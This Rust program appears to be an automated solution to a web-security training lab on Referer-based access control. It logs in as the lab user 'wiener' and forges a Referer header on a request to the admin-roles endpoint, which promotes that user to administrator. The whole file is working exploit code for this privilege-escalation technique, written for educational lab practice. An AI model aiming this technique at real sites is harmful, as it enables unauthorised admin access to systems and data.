/*************************************************************************
*
* Lab: Referer-based access control
*
* Hack Steps: 
*      1. Login as wiener
*      2. Upgrade wiener to be an admin by adding Referer header
*
**************************************************************************/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a11008104b68fea8170a33c00580042.web-security-academy.net";

fn main() {
    print!("⦗1⦘ Logging in as wiener.. ");
    flush_terminal();

    let web_client = build_web_client();
    let login_as_wiener = web_client
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()));

    let session = get_session_cookie(&login_as_wiener);

    println!("{}", "OK".green());
    print!("⦗2⦘ Upgrading wiener to be an admin by adding Referer header.. ");
    flush_terminal();

    web_client
        .get(format!(
            "{LAB_URL}/admin-roles?username=wiener&action=upgrade"
        ))
        .header("Cookie", format!("session={session}"))
        .header("Referer", format!("{LAB_URL}/admin"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to upgrade wiener to be an admin".red()
        ));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
